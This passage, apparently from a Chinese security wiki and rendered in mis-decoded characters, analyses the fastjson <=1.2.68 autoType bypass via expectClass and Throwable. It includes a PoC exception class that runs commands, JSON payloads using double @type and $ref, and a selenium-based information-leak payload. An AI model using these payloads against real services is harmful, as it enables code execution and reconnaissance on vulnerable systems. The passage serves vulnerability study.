å¯¹æ¼æ´è¿›è¡Œäº†ä¿®å¤ï¼Œåœ¨ <code>MiscCodec</code>â€‹ å¤„ç† Class ç±»çš„åœ°æ–¹ï¼Œè®¾ç½®äº† cache ä¸º false ï¼Œå¹¶ä¸” <code>loadClass</code>â€‹ é‡è½½æ–¹æ³•çš„é»˜è®¤çš„è°ƒç”¨æ”¹ä¸ºä¸ç¼“å­˜ï¼Œè¿™å°±é¿å…äº†ä½¿ç”¨äº† Class æå‰å°†æ¶æ„ç±»åç¼“å­˜è¿›å»ã€‚</p><p>è¿™ä¸ªå®‰å…¨ä¿®å¤ä¸º fastjson å¸¦æ¥äº†ä¸€å®šæ—¶é—´çš„å¹³é™ï¼Œç›´åˆ° 1.2.68 ç‰ˆæœ¬å‡ºç°äº†æ–°çš„æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚</p><blockquote><p><strong>å½±å“ç‰ˆæœ¬</strong>ï¼š<code>fastjson &lt;= 1.2.68</code>â€‹</p><p><strong>æè¿°</strong>ï¼šåˆ©ç”¨ <code>expectClass</code>â€‹ ç»•è¿‡ <code>checkAutoType()</code>â€‹ ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯ä¸ºäº†ç»•è¿‡å®‰å…¨æ£€æŸ¥çš„æ€è·¯çš„å»¶ä¼¸ã€‚ä¸»è¦ä½¿ç”¨ <code>Throwable</code>â€‹ å’Œ <code>AutoCloseable</code>â€‹ è¿›è¡Œç»•è¿‡ã€‚</p></blockquote><p>ç‰ˆæœ¬ 1.2.68 æœ¬èº«æ›´æ–°äº†ä¸€ä¸ªæ–°çš„å®‰å…¨æ§åˆ¶ç‚¹ safeModeï¼Œå¦‚æœåº”ç”¨ç¨‹åºå¼€å¯äº† safeModeï¼Œå°†åœ¨ <code>checkAutoType()</code>â€‹ ä¸­ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯å®Œå…¨ç¦æ­¢ autoTypeï¼Œä¸å¾—ä¸è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªä¸€åŠ³æ°¸é€¸çš„ä¿®å¤æ–¹å¼ã€‚ï¼ˆ<strong>é»˜è®¤æ˜¯ä¸å¼€å¯çš„</strong>ï¼‰</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240424131826-kpy74bo.cd541ca0.png" alt="image" loading="lazy">â€‹</p><p>ä½†ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¸ªç‰ˆæœ¬æŠ¥å‡ºäº†ä¸€ä¸ªæ–°çš„ autoType å¼€å…³ç»•è¿‡æ–¹å¼ï¼šåˆ©ç”¨ expectClass ç»•è¿‡ <code>checkAutoType()</code>â€‹ã€‚</p><p>åœ¨ <code>checkAutoType()</code>â€‹ å‡½æ•°ä¸­æœ‰è¿™æ ·çš„é€»è¾‘ï¼šå¦‚æœå‡½æ•°æœ‰ <code>expectClass</code>â€‹ å…¥å‚ï¼Œä¸”æˆ‘ä»¬ä¼ å…¥çš„ç±»åæ˜¯ <code>expectClass</code>â€‹ çš„å­ç±»æˆ–å®ç°ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼Œå°±å¯ä»¥é€šè¿‡ <code>checkAutoType()</code>â€‹ çš„å®‰å…¨æ£€æµ‹ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240424132032-kwio2xi.f3251081.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240424132312-ojukkov.35611ab7.png" alt="image" loading="lazy">â€‹</p><p>â€</p><p><strong>ã€æ€»ç»“å¦‚ä¸‹ã€‘</strong></p><ul><li>â€‹<code>expectClass</code>â€‹ ä¸ä¸º <code>null</code>â€‹ï¼Œä¸”ä¸ç­‰äº <code>Object.class</code>â€‹ã€<code>Serializable.class</code>â€‹ã€<code>Cloneable.class</code>â€‹ã€<code>Closeable.class</code>â€‹ã€<code>EventListener.class</code>â€‹ã€<code>Iterable.class</code>â€‹ã€<code>Collection.class</code>â€‹ï¼›<code>expectClass</code>â€‹ éœ€è¦åœ¨ç¼“å­˜é›†åˆ <code>TypeUtils#mappings</code>â€‹ ä¸­</li><li>â€‹<code>expectClass</code>â€‹ å’Œ <code>typeName</code>â€‹ éƒ½ä¸åœ¨é»‘åå•ä¸­</li><li>â€‹<code>typeName</code>â€‹ ä¸æ˜¯ <code>ClassLoader</code>â€‹ã€<code>DataSource</code>â€‹ã€<code>RowSet</code>â€‹ çš„å­ç±»</li><li>â€‹<code>typeName</code>â€‹ æ˜¯ <code>expectClass</code>â€‹ çš„å­ç±»ã€‚</li></ul><p>è¿™ä¸ª <code>expectClass</code>â€‹ å¹¶ä¸æ˜¯ä»€ä¹ˆé™Œç”Ÿçš„æ–°åè¯ï¼Œæˆ‘ä»¬åœ¨å‰ç½®çŸ¥è¯†é‡Œé¢çš„ <code>demo</code>â€‹ ä¸­çš„è¿™ä¸ª <code>Person.class</code>â€‹ å°±æ˜¯æœŸæœ›ç±»ã€‚</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token class-name">Person</span> person2 <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString2<span class="token punctuation">,</span> <span class="token class-name">Person</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ‰¾ä¸€ä¸‹ <code>checkAutoType()</code>â€‹ å‡ ä¸ªé‡è½½æ–¹æ³•æ˜¯å¦æœ‰å¯æ§çš„ <code>expectClass</code>â€‹ çš„å…¥å‚æ–¹å¼ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†ä»¥ä¸‹ä¸¤ä¸ªç±»ã€‚</p><ul><li>â€‹<code>ThrowableDeserializer#deserialze()</code>â€‹</li><li>â€‹<code>JavaBeanDeserializer#deserialze()</code>â€‹</li></ul><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425112708-aog4gzn.7e7ad60c.png" alt="image" loading="lazy">â€‹</p><p>â€‹<code>JavaBeanDeserializer</code> â€‹å’Œ <code>ThrowableDeserializer</code> â€‹æ˜¯ fastjson ä¸­ä¸¤ä¸ªååºåˆ—åŒ–å™¨ï¼Œå‰è€…æ˜¯é»˜è®¤ååºåˆ—åŒ–å™¨ï¼Œåè€…æ˜¯é’ˆå¯¹å¼‚å¸¸ç±»å¯¹è±¡çš„ååºåˆ—åŒ–å™¨ã€‚</p><h3 id="throwable-åˆ©ç”¨" tabindex="-1"><a class="header-anchor" href="#throwable-åˆ©ç”¨"><span>Throwable åˆ©ç”¨</span></a></h3><h4 id="åŸç†" tabindex="-1"><a class="header-anchor" href="#åŸç†"><span>åŸç†</span></a></h4><p><strong>ã€ç¬¬ä¸€æ¬¡è§£æ</strong> <strong>â€‹</strong>â€‹ <strong>â€‹<code>@type</code>â€‹</strong>â€‹<strong>â€‹</strong>â€‹ <strong>ã€‘</strong></p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425145523-trirgmp.be591767.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425145006-3u8b6oy.be730d86.png" alt="image" loading="lazy">â€‹</p><p>â€‹<code>com.alibaba.fastjson.parser.deserializer.ThrowableDeserializer#deserialze</code>â€‹ æ–¹æ³•ç›´æ¥å°† <code>@type</code>â€‹ åæŒ‡å®šçš„å¼‚å¸¸ç±»è¿›è¡Œäº† <code>ParserConfig#checkAutoType()</code>â€‹ æ ¡éªŒã€‚</p><p>è¿›å…¥åˆ° <code>ThrowableDeserializer#deserialze()</code>â€‹ åï¼Œè¯æ³•åˆ†æå™¨ä¼šç»§ç»­éå† JSON å­—ç¬¦ä¸²å‰©ä½™çš„éƒ¨åˆ†ï¼Œ<strong><mark>å¦‚æœç´§æ¥ç€çš„é”®è¿˜æ˜¯ä¸€ä¸ª</mark></strong> <code>@type</code>â€‹ çš„è¯ï¼Œå°±ä¼šå°†å®ƒçš„**<mark>å€¼</mark>**ä¸” <code>Throwable.class</code>â€‹ ä½œä¸ºæœŸæœ›ç±» <code>expectClass</code>â€‹ï¼Œä¸€åŒä¼ å…¥ <code>ParserConfig#checkAutoType()</code>â€‹ è¿›è¡Œæ ¡éªŒã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425150456-b5rgf7h.273d233e.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425150719-jdji7as.f24d1f44.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425150713-rricoje.b8227b99.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425150835-gpve8q7.9120969e.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425151044-zb3jhqa.7e277d82.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425151450-7ism17s.1388ae72.png" alt="image" title="å› ä¸ºè¿™å‡ è¡Œä»£ç çš„é™åˆ¶ï¼Œå¤§éƒ¨åˆ†çš„ JNDI gadget éƒ½ä¸èƒ½ç”¨äº†" loading="lazy">â€‹</p><p>é€šè¿‡ <code>checkAutoType()</code>â€‹ ä¹‹åï¼Œå°†ä½¿ç”¨ <code>createException</code>â€‹ æ¥åˆ›å»ºå¼‚å¸¸ç±»çš„å®ä¾‹ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425152648-abkxnca.0789efa1.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425152803-m6loflc.abb6b119.png" alt="image" loading="lazy">â€‹</p><p>è¿™å°±å½¢æˆäº† <code>Throwable</code>â€‹ å­ç±»ç»•è¿‡ <code>checkAutoType()</code>â€‹ çš„æ–¹å¼ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ° <code>Throwable</code>â€‹ çš„å­ç±»ï¼Œè¿™ä¸ªç±»çš„ <code>getter/setter/static block/constructor</code>â€‹ ä¸­å«æœ‰å…·æœ‰å¨èƒçš„ä»£ç é€»è¾‘ã€‚</p><h4 id="poc" tabindex="-1"><a class="header-anchor" href="#poc"><span>POC</span></a></h4><p>å†™ä¸€ä¸ªæœ‰é—®é¢˜çš„å¼‚å¸¸ç±»ï¼Œå»éªŒè¯ Throwable è¿™ä¸ªåˆ©ç”¨ç‚¹ã€‚</p><p><strong>ã€å¼‚å¸¸ç±»</strong> <strong>â€‹</strong>â€‹<strong>â€‹<code>ExecException</code>â€‹</strong>â€‹<strong>â€‹</strong>â€‹ <strong>ã€‘</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token constant">EXP</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExecException</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> command<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCommand</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>command <span class="token operator">=</span> command<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€ç„¶åå°±æ˜¯æ„é€  JSON å­—ç¬¦ä¸²ã€‘</strong> è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº <code>java.lang.Throwable</code>â€‹ è¿™ä¸ªç±»ä¸åœ¨ç¼“å­˜é›†åˆ <code>TypeUtils#mappings</code>â€‹ ä¸­ï¼Œæ‰€ä»¥æœªå¼€å¯ autoType çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªç±»æ˜¯ä¸èƒ½é€šè¿‡ <code>ParserConfig#checkAutoType()</code>â€‹ çš„æ ¡éªŒçš„ã€‚</p><p>è¿™é‡Œåœ¨ JSON å­—ç¬¦ä¸²ä¸­ä½¿ç”¨å®ƒçš„ä¸€ä¸ªå­ç±» <code>java.lang.Exception</code>â€‹ï¼Œå› ä¸º <code>java.lang.Exception</code>â€‹ æ˜¯åœ¨ç¼“å­˜é›†åˆ <code>TypeUtils#mappigns</code>â€‹ ä¸­çš„ã€‚</p><p>â€‹<code>com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings</code>â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425135447-pshk3ko.2360917b.png" alt="image" loading="lazy">â€‹</p><p>å¦å¤–è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æˆ‘ä»¬çš„ <code>ExecException</code>â€‹ ç±»çš„å±é™©æ“ä½œæ˜¯åœ¨ getter æ–¹æ³•ä¸­çš„ã€‚è€Œå‰é¢æåˆ°ï¼Œååºåˆ—åŒ–å¼‚å¸¸ç±»è¿‡ç¨‹ä¸­ï¼Œåªä¼šæ‰§è¡Œåˆ° setter æ–¹æ³•ï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œ getter æ–¹æ³•ã€‚ï¼ˆ<mark>ä½†æ˜¯å¦‚æœæ˜¯é€šè¿‡</mark> <code>JSON.parseObject();</code>â€‹ <mark>çš„æ–¹æ³•è¿›è¡Œååºåˆ—åŒ–çš„è¯åˆ™ä¼šè°ƒç”¨æ‰€æœ‰çš„ getter å’Œ setter æ–¹æ³•ã€‚</mark>ï¼‰</p><p>å¦‚æœæ˜¯ <code>JSON.parse()</code>â€‹ è¿›è¡Œååºåˆ—åŒ–çš„è¯ï¼Œè¿™é‡Œå¯ä»¥åˆ©ç”¨ fastjson çš„ JSONPath ç‰¹æ€§ <code>$ref</code>â€‹ å»å¼•ç”¨æŒ‡å®šå¯¹è±¡çš„æŸä¸ª <code>xxx</code>â€‹ å±æ€§ï¼Œä»è€Œè®¿é—®è¯¥å¯¹è±¡çš„ <code>getXXX()</code>â€‹ æ–¹æ³•ã€‚ã€æ¥è‡ª <a href="https://github.com/threedr3am/learnjavabug/commit/ea61297cf7b2125ecae0064d2b8061a9e32db1e6#diff-95dea369074735c578ad43e600aaade743b2b52878fedbbdb76ea6d4936956a4" target="_blank" rel="noopener noreferrer">feat:fastjson ä¸€ç§åˆ©ç”¨ $ref å‡ ä¹ä»»æ„ getter è§¦å‘çš„æ–¹æ³• Â· threedr3am/learnjavabug@ea61297 (@threedr3am)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a>ã€‘</p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> payload1 <span class="token operator">=</span> <span class="token string">&quot;{\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;  \&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;  \&quot;@type\&quot;: \&quot;EXP.ExecException\&quot;,\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;  \&quot;command\&quot;: \&quot;calc\&quot;\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;}&quot;</span><span class="token punctuation">;</span>

        <span class="token class-name">String</span> payload2 <span class="token operator">=</span> <span class="token string">&quot;{\&quot;x\&quot;:\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;\t{\&quot;@type\&quot;:\&quot;java.lang.Exception\&quot;,\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;\t \&quot;@type\&quot;:\&quot;EXP.ExecException\&quot;, \n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot;\t         \&quot;command\&quot;:\&quot;calc\&quot;}, \n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot; \&quot;y\&quot;:{\&quot;$ref\&quot;:\&quot;$x.message\&quot;}\n&quot;</span> <span class="token operator">+</span>
                <span class="token string">&quot; }&quot;</span><span class="token punctuation">;</span>

        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// payload1 æˆ– payload2 å‡å¯</span>
        <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>payload2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// åªèƒ½ä½¿ç”¨ payload2</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>è¿è¡Œ PoC åæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚</p><p>ä¸Šè¿° PoC åªæ˜¯ä¸ºäº†éªŒè¯ <code>Throwable</code>â€‹ è¿™ä¸ªåˆ©ç”¨ç‚¹ã€‚<strong>å®é™…ä¸Šå¾ˆå°‘æœ‰å¼‚å¸¸ç±»ä¼šä½¿ç”¨åˆ°é«˜å±å‡½æ•°ï¼Œæ‰€ä»¥ç›®å‰è¿˜æ²¡è§æœ‰å…¬å¼€çš„å¯é’ˆå¯¹ Throwable è¿™ä¸ªåˆ©ç”¨ç‚¹çš„ RCE gadgetã€‚</strong></p><p>ä¸è¿‡ <a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ" target="_blank" rel="noopener noreferrer">@ æµ…è“<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> å€’æ˜¯ç»™å‡ºäº†ä¸€ä¸ªé RCE çš„ gadgetï¼Œå®ƒéœ€è¦ç›®æ ‡ç¯å¢ƒä¾èµ– selenium åº“ã€‚</p><h4 id="ä¾èµ–-selenium-çš„ä¿¡æ¯æ³„éœ²-gadget" tabindex="-1"><a class="header-anchor" href="#ä¾èµ–-selenium-çš„ä¿¡æ¯æ³„éœ²-gadget"><span>ä¾èµ– selenium çš„ä¿¡æ¯æ³„éœ² gadget</span></a></h4><p>ã€<strong>æ·»åŠ ä¾èµ–ã€‘</strong></p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.seleniumhq.selenium<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>selenium-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>4.1.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>å…¶ä¸­ <code>org.openqa.selenium.WebDriverException</code>â€‹ ç±»çš„ <code>getMessage()</code>â€‹ æ–¹æ³•å’Œ <code>getSystemInformation()</code>â€‹ æ–¹æ³•éƒ½èƒ½è·å–ä¸€äº›ç³»ç»Ÿä¿¡æ¯ã€‚æ¯”å¦‚ï¼šIP åœ°å€ã€ä¸»æœºåã€ç³»ç»Ÿæ¶æ„ã€ç³»ç»Ÿåç§°ã€ç³»ç»Ÿç‰ˆæœ¬ã€JDK ç‰ˆæœ¬ã€selenium webdriver ç‰ˆæœ¬ã€‚</p><p>åŒæ—¶ç”±äºæ˜¯å¼‚å¸¸ç±»ï¼Œçˆ¶ç±»çš„ <code>getStackTrace()</code>â€‹ ä¹Ÿä¼šè¢«è°ƒç”¨ï¼Œä¼šè¾“å‡ºå½“å‰æ–¹æ³•æ ˆä¿¡æ¯ï¼Œå¯ä»ä¸­çœ‹å‡ºä½¿ç”¨äº†ä»€ä¹ˆæ¡†æ¶ã€‚</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240425143021-5b0deuz.eabc2d5d.png" alt="image" loading="lazy">â€‹</p><p>å› æ­¤ï¼Œå¯æ ¹æ®æƒ…å†µæ„é€  pocï¼ˆå› ä¸ºä¿¡æ¯ä¸ä¸€å®šèƒ½å›æ˜¾ï¼Œå–å†³äºç›®æ ‡ç¨‹åºçš„ä»£ç å®ç°ï¼‰ï¼Œç±»ä¼¼è¿™æ ·ã€‚</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    <span class="token property">&quot;x&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.Exception&quot;</span><span class="token punctuation">,</span>
        <span class="token property">&quot;@type&quot;</span><span class="token operator">:</span> <span class="token string">&quot;org.openqa.selenium.WebDriverException&quot;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">&quot;y&quot;</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token property">&quot;$ref&quot;</span><span class="token operator">:</span> <span class="token string">&quot;$x.systemInformation&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// ======== </span>
ç”¨åˆ°äº† $ref å­—æ®µæ¥è°ƒç”¨å¼‚å¸¸ç±»å¯¹è±¡çš„ getSystemInformation æ–¹æ³•æŠŠå€¼å¼•ç”¨åˆ° y å­—æ®µï¼Œè¿™ä¸ªæ ¹æ®å®é™…ç¯å¢ƒå›æ˜¾ä»€ä¹ˆå­—æ®µå°±å¡«ä»€ä¹ˆå­—æ®µå‘—
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="å…¶ä»–ç”¨é€”å®ä¾‹" tabindex="-1"><a class="header-anchor" href="#å…¶ä»–ç”¨é€”å®ä¾‹"><span>å…¶ä»–ç”¨é€”å®ä¾‹</span></a></h4><p>é™¤æ­¤ä¹‹å¤–å…¶å®è¿˜å¯ä»¥æœ‰å…¶ä»–ç”¨é€”ï¼Œä¾‹å¦‚å¯ä»¥ç»•è¿‡ç±»å¯¹è±¡çš„è®¿é—®ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œ<strong><mark>æŸä¸ªå¼‚å¸¸ç±»çš„ get æ–¹æ³•è¿”å›çš„å¯¹è±¡ç±»å‹æ˜¯ DataSourceï¼Œè¿™ä¸ªç±»å‹è‚¯å®šæ˜¯ä¸å…è®¸è¢«ååºåˆ—åŒ–çš„ã€‚</mark></strong> <mark>ä½†ä»–åœ¨å¼‚å¸¸ç±»ä¸­è¢«ä¼ æ¥çš„å…è®¸è¢«ååºåˆ—åŒ–çš„ç±»å¯¹è±¡æ„é€ æˆäº†ä¸€ä¸ª DataSource å¯¹è±¡ã€‚å†å»è°ƒç”¨ get æ–¹æ³•è®¿é—®è¿™ä¸ª DataSource çš„æ—¶å€™ï¼Œfastjson å°±ç®¡ä¸ç€äº†ã€‚</mark></p><p>è¿™ç§ä¾‹å­æˆ‘åœ¨ apache abdera çš„ä¸€ä¸ªå¼‚å¸¸ç±»ä¸­è§åˆ°è¿‡ã€‚</p><p><a href="https://github.com/apache/abdera/blob/43fae3a0bb450895042bf0825f11fbf39832e830/server/src/main/java/org/apache/abdera/server/exceptions/AbderaServerException.java" target="_blank" rel="noopener noreferrer">/org/apache/abdera/server/exceptions/AbderaServerException.java<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><p><strong>ã€ç±»ä¼¼çš„ç±»ã€‘</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DatasourceException</span> <span class="token keyword">extends</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token class-name">DatasourceException</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">DataSource</span> dataSource<span class="token punctuation">;</span>

